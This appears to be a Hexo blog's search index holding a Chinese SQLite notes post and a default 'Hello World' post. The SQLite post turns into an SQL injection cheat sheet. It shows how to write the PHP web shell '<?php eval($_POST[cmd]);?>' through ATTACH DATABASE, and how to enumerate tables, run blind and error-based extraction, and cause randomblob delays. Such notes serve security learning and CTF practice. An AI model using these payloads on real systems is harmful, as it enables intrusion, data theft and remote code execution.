<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqlite</title>
      <link href="/2020/02/14/sqlite/"/>
      <url>/2020/02/14/sqlite/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h2><p><em>sqlite没有if和sleep语句</em></p><h3 id="sqlite的-是拼接字符串"><a href="#sqlite的-是拼接字符串" class="headerlink" title="sqlite的||是拼接字符串"></a>sqlite的||是拼接字符串</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> select 123||4;1234    </code></pre><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>–空格</p><p>/* */</p><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p><code>select column1 from table where 1=1 and 2=2</code></p><h3 id="sqlite数据类型"><a href="#sqlite数据类型" class="headerlink" title="sqlite数据类型"></a>sqlite数据类型</h3><ul><li>null</li><li>integer</li><li>real 浮点数</li><li>text 文本字符串 (utf-8,utf-16be或utf-16le 存储)</li><li>BLOB blob根据输入存储</li></ul><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="创建数据库-sqlite3-test-db"><a href="#创建数据库-sqlite3-test-db" class="headerlink" title="创建数据库: $sqlite3 test.db"></a>创建数据库: <code>$sqlite3 test.db</code></h4><p>会在当前目录创建 test.db</p><pre><code>sqlite&gt; .databases #检查是否在数据库列表main: /root/download/test.db</code></pre><h4 id="ATTACH附加数据库，如果没有则会创建"><a href="#ATTACH附加数据库，如果没有则会创建" class="headerlink" title="ATTACH附加数据库，如果没有则会创建"></a>ATTACH附加数据库，如果没有则会创建</h4><ul><li>可以利用这个来写shell<pre class=" language-aidl"><code class="language-aidl">sqlite> ATTACH DATABASE '/root/download/shell.db' as 'haah';sqlite> .databasemain: /root/download/test.dbhaah: /root/download/shell.db</code></pre></li></ul><h3 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> .dump #显示PRAGMA foreign_keys=OFF;BEGIN TRANSACTION;COMMIT;</code></pre><pre class=" language-aidl"><code class="language-aidl">$sqlite3 testdb.db .dump >123.sql #导出到文件中 </code></pre><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><h4 id="table"><a href="#table" class="headerlink" title=".table"></a>.table</h4><p>查看表</p><h4 id="insert，select，update和mysql类似"><a href="#insert，select，update和mysql类似" class="headerlink" title="insert，select，update和mysql类似"></a>insert，select，update和mysql类似</h4><h4 id="create-table"><a href="#create-table" class="headerlink" title="create table"></a>create table</h4><pre class=" language-aidl"><code class="language-aidl">CREATE TABLE `vote` (  `id` INTEGER PRIMARY KEY AUTOINCREMENT,  `name` TEXT NOT NULL,  `count` INTEGER);</code></pre><h4 id="insert-table"><a href="#insert-table" class="headerlink" title="insert table"></a>insert table</h4><pre class=" language-aidl"><code class="language-aidl">INSERT INTO `vote` (`name`, `count`) VALUES  ('dog', 0),  ('cat', 0),  ('zebra', 0),  ('koala', 0);</code></pre><h3 id="GLOB-类似like"><a href="#GLOB-类似like" class="headerlink" title="GLOB  类似like"></a>GLOB  类似like</h3><p>GLOB对大小写敏感，而且使用linux的符号 </p><ul><li>*</li></ul><ul><li>?</li></ul><pre><code>sqlite&gt; select * from vote where name GLOB 'do?';id          name        count     ----------  ----------  ----------1           dog         0</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="abs"><a href="#abs" class="headerlink" title="abs()"></a>abs()</h4><p>如果整数是<code>-9223372036854775808</code>会溢出错误</p><h4 id="coalesce-可以多个参数，返回第一个不是null的参数"><a href="#coalesce-可以多个参数，返回第一个不是null的参数" class="headerlink" title="coalesce()可以多个参数，返回第一个不是null的参数"></a>coalesce()可以多个参数，返回第一个不是null的参数</h4><pre class=" language-cookie"><code class="language-cookie">select coalesce(null,'a','abbbb');coalesce(null,'a','a')----------------------a         </code></pre><pre class=" language-cookie"><code class="language-cookie">select coalesce(nullif(2,2),'hah');coalesce(nullif(2,2),'hah')---------------------------hah              </code></pre><p>相当于 if 2=2 return hah else null</p><h4 id="hex-char"><a href="#hex-char" class="headerlink" title="hex,char"></a>hex,char</h4><h4 id="nullif-和-ifnull"><a href="#nullif-和-ifnull" class="headerlink" title="nullif 和 ifnull"></a>nullif 和 ifnull</h4><ul><li>nullif</li></ul><p>两个参数，nullif(a,b),如果a和b相等返回 null</p><p>如果a和b不想等，返回 a</p><ul><li>ifnull </li></ul><p>和 <code>coalesce()</code>类似，不过只能两个参数，返回第一个非null</p><p>如果都为null，返回null</p><h4 id="instr-a-b"><a href="#instr-a-b" class="headerlink" title="instr(a,b)"></a>instr(a,b)</h4><p>返回<code>b</code>在<code>a</code>出现的位置</p><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><h4 id="lower和-upper"><a href="#lower和-upper" class="headerlink" title="lower和 upper"></a>lower和 upper</h4><h4 id="max-a-b"><a href="#max-a-b" class="headerlink" title="max(a,b)"></a>max(a,b)</h4><h4 id="like-a-b"><a href="#like-a-b" class="headerlink" title="like(a,b)"></a>like(a,b)</h4><p>相当于 <code>b</code> like <code>a</code></p><p>可以用 _ % </p><pre><code>sqlite&gt; select like('ab_','abc');like('ab_','abc')-----------------1          </code></pre><ul><li>like可以有第三个参数，</li></ul><p>相当于like语句的 ESCAPE ，转义</p><p>在 <code>%</code> 或者 <code>_</code> 前面添加什么字符可以把 <code>%</code>或者 <code>_</code>当作字符串</p><p>而不是匹配符号 </p><pre class=" language-cookie"><code class="language-cookie">sqlite> select like('barz_','bar_','z');like('barz_','bar_','z')------------------------1             </code></pre><p>这里把 z 用作 和 \ 类似的作用</p><h4 id="ltrim-a-和-ltrim-a-b"><a href="#ltrim-a-和-ltrim-a-b" class="headerlink" title="ltrim(a) 和 ltrim(a,b)"></a>ltrim(a) 和 ltrim(a,b)</h4><p>删除左侧字符串</p><ul><li>一个参数 返回删除左侧空格的字符串</li><li>两个参数 a,b ，返回删除空格和第二个参数<code>b</code>字符串<pre class=" language-cookie"><code class="language-cookie">sqlite> SELECT ltrim('aaaa bc','a');ltrim('aaaa bc','a')bc</code></pre></li></ul><h4 id="rtrim-a-和-rtrim-a-b-和ltrim类似"><a href="#rtrim-a-和-rtrim-a-b-和ltrim类似" class="headerlink" title="rtrim(a)和 rtrim(a,b) 和ltrim类似"></a>rtrim(a)和 rtrim(a,b) 和ltrim类似</h4><h4 id="trim-就是-rtrim-ltrim"><a href="#trim-就是-rtrim-ltrim" class="headerlink" title="trim 就是 rtrim + ltrim"></a>trim 就是 rtrim + ltrim</h4><h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>和普通的 格式化字符串一样 ，</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select printf("aw%s",'sl');printf("aw%s",'sl')awsl</code></pre><h4 id="quote-a"><a href="#quote-a" class="headerlink" title="quote(a)"></a>quote(a)</h4><p>将字符串 带上 ‘ ‘ </p><pre class=" language-cookie"><code class="language-cookie">平常：sqlite> select 1233;1233      ----------1233      quote:sqlite> SELECT quote('1233');quote('1233')-------------'1233'    </code></pre><h4 id="random"><a href="#random" class="headerlink" title="random()"></a>random()</h4><p>返回随机数</p><h4 id="randomblob-a"><a href="#randomblob-a" class="headerlink" title="randomblob(a)"></a>randomblob(a)</h4><p>返回 a个字节的 blob</p><p>如果很长可以造成时间盲注</p><h4 id="replace-a-b-c"><a href="#replace-a-b-c" class="headerlink" title="replace(a,b,c)"></a>replace(a,b,c)</h4><p>把 a中的 b换成c</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select replace('a{ab}','a','b');replace('a{ab}','a','b')------------------------b{bb}            </code></pre><h4 id="soundex"><a href="#soundex" class="headerlink" title="soundex()"></a>soundex()</h4><p>返回字符串的 <code>soundex</code>编码 ，很迷</p><p>开眼界了</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select soundex('a');soundex('a')------------A000       </code></pre><h4 id="sqlite-version-版本"><a href="#sqlite-version-版本" class="headerlink" title="sqlite_version() 版本"></a>sqlite_version() 版本</h4><h4 id="substr-和mysql"><a href="#substr-和mysql" class="headerlink" title="substr() 和mysql"></a>substr() 和mysql</h4><h4 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h4><p>返回字符串类型</p><h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode()"></a>unicode()</h4><p>返回第一个字符的<code>unicode</code> 数字</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select unicode('a');unicode('a')------------97         sqlite> select unicode('哈');unicode('哈')------------21704     </code></pre><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="写shell-需要叠堆注入"><a href="#写shell-需要叠堆注入" class="headerlink" title="写shell 需要叠堆注入"></a>写shell 需要叠堆注入</h3><pre class=" language-aidl"><code class="language-aidl">ATTACH DATABASE '/tmp/good.php' as 'm0on';CREATE TABLE m0on.shell_haha(`haha` text);INSERT INTO m0on.shell_haha (haha) VALUES ('<?php eval($_POST[cmd]);?>');</code></pre><p>cat /tmp/good.php</p><pre><code>��A&lt;?php eval($_POST[cmd]);?&gt;</code></pre><h3 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h3><pre class=" language-cookie"><code class="language-cookie">select name from sqlite_master where type='table';select tbl_name from sqlite_master where type='table';</code></pre><h3 id="获取-表的结构，包括列名"><a href="#获取-表的结构，包括列名" class="headerlink" title="获取 表的结构，包括列名"></a>获取 表的结构，包括列名</h3><pre class=" language-cookie"><code class="language-cookie">select sql from sqlite_master where name='表名';sqlite> select sql from sqlite_master where name='shell';sql                             --------------------------------CREATE TABLE shell(first,second)列名是 first 和 second</code></pre><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="substr-unicode"><a href="#substr-unicode" class="headerlink" title="substr ,unicode"></a>substr ,unicode</h4><pre class=" language-cookie"><code class="language-cookie">select unicode(substr('abc',1,1));select substr('abc',1,1);</code></pre><p>使用<code>unicode()</code> 类似于 mysql的<code>ascii()</code></p><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><pre class=" language-cookie"><code class="language-cookie">select like('a%','abc');</code></pre><h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>需要扩展</p><pre class=" language-cookie"><code class="language-cookie">apt-get install sqlite3-pcre</code></pre><p>或者</p><pre class=" language-cookie"><code class="language-cookie">sqlite>  .load /usr/lib/sqlite3/pcre.so</code></pre><p>语句类似mysql不说了</p><h4 id="GLOB"><a href="#GLOB" class="headerlink" title="GLOB"></a>GLOB</h4><p>类似<code>like</code>，不过用的是unix的 * ?</p><pre class=" language-cookie"><code class="language-cookie">select 'abc' GLOb 'a*'; 'abc' GLOb 'a*'---------------1          </code></pre><h4 id="nullif-和-instr"><a href="#nullif-和-instr" class="headerlink" title="nullif 和 instr()"></a>nullif 和 instr()</h4><p>instr(a,b) 返回 b第一次出现在a的地方 ，</p><p>和<code>nullif()</code>一起用 如果是出现在<code>1</code>就返回null</p><pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','z'),1); //0 </code></pre><p>如果没有匹配到会返回<code>0</code>,这就和null一样效果</p><p>为了防止这种情况，在后面加上 <code>||1</code> 拼接字符串</p><pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','b'),1)||1; // 21select nullif(instr('abca','a'),1)||1;  //nullselect nullif(instr('abca','ab'),1)||1; //null</code></pre><h4 id="利用-ltrim-和length-注入"><a href="#利用-ltrim-和length-注入" class="headerlink" title="利用 ltrim() 和length() 注入"></a>利用 ltrim() 和length() 注入</h4><p>使用<code>length()</code>获取字段的长度</p><pre class=" language-cookie"><code class="language-cookie">select length("vote")=4;</code></pre><pre class=" language-cookie"><code class="language-cookie">sqlite> select length(ltrim("vote","vo"))=2;</code></pre><p>然后<code>ltrim()</code> 函数从左往右爆破字符串，</p><p>如果爆破的字符串正确，那么length就会减少</p><h4 id="同理-rtrim-trim-和-length"><a href="#同理-rtrim-trim-和-length" class="headerlink" title="同理 rtrim()/trim()和 length()"></a>同理 rtrim()/trim()和 length()</h4><h4 id="replace-和length-注入"><a href="#replace-和length-注入" class="headerlink" title="replace()和length()注入"></a>replace()和length()注入</h4><p>最好前面有标识符号，<code>flag{</code> 这样<br>和 ltrim 和 rtrim类似<br>不然麻烦</p><pre class=" language-cookie"><code class="language-cookie">select  length(replace('flag{aza}','flag{a',''))=3;//1 select length(replace('flag{aza}','flag{b',''))=3;//0</code></pre><h4 id="ltrim-和-length-和nullif"><a href="#ltrim-和-length-和nullif" class="headerlink" title="ltrim() 和 length()和nullif()"></a>ltrim() 和 length()和nullif()</h4><pre class=" language-cookie"><code class="language-cookie">select nullif(length(ltrim("vote","vo")),2);</code></pre><p>nullif 和 length 和ltrim 配合</p><p>如果 正确返回<code>null</code></p><h4 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a>case when then else end</h4><pre class=" language-cookie"><code class="language-cookie">select CASE  WHEN  1=1 THEN 1 ELSE 0 END ;//1select CASE  WHEN  1=2 THEN 1 ELSE 0 END ; //0</code></pre><h4 id="利用abs-报错，ifnull-nullif"><a href="#利用abs-报错，ifnull-nullif" class="headerlink" title="利用abs()报错，ifnull(),nullif()"></a>利用abs()报错，ifnull(),nullif()</h4><ul><li><p>ifnull可以用<code>coalesce()</code>函数代替</p></li><li><p><code>abs()</code>函数存在整形溢出</p></li><li><p>当abs()参数是<code>-9223372036854775808</code>也就是<code>0x8000000000000000</code><br>就会报错</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select abs(0x99999999999999999);Error: hex literal too big: 0x99999999999999999</code></pre><p>所以基于报错的注入：</p></li></ul><p>通过nullif和ifnull来决定是否报错<br>如果 <code>1=1</code> 就报错</p><pre class=" language-cookie"><code class="language-cookie">select abs(ifnull(nullif(1,1),0x8000000000000000));Error: integer overflowselect abs(ifnull(nullif(1,2),0x8000000000000000));2</code></pre><h3 id="时间盲注-randomblob"><a href="#时间盲注-randomblob" class="headerlink" title="时间盲注 randomblob()"></a>时间盲注 randomblob()</h3><p>randomblob(n)可以产生n长度的字符串，足够长就可以延时</p><pre class=" language-cookie"><code class="language-cookie">select case when substr('abc',1,1)='a' then randomblob(1000000) else 0 end;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/02/10/hello-world/"/>
      <url>/2020/02/10/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p>##写文章</p><pre><code>---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><pre class=" language-$xslt"><code class="language-$xslt">title    Markdown 的文件标题    文章标题，强烈建议填写此选项date    文件创建时的日期时间    发布时间，强烈建议填写此选项，且最好保证全局唯一author    根 _config.yml 中的 author    文章作者img    featureImages 中的某个值    文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpgtop    true    推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章cover    false    v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中coverImg    无    v1.0.2版本新增，表示该文章在首页轮播封面需**要显示的图片路径，如果没有，则默认使用文章的特色图片password    无    文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项toc    true    是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项mathjax    false    是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行summary    无    文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories    无    文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类tags    无    文章标签，一篇文章可以多个标签</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
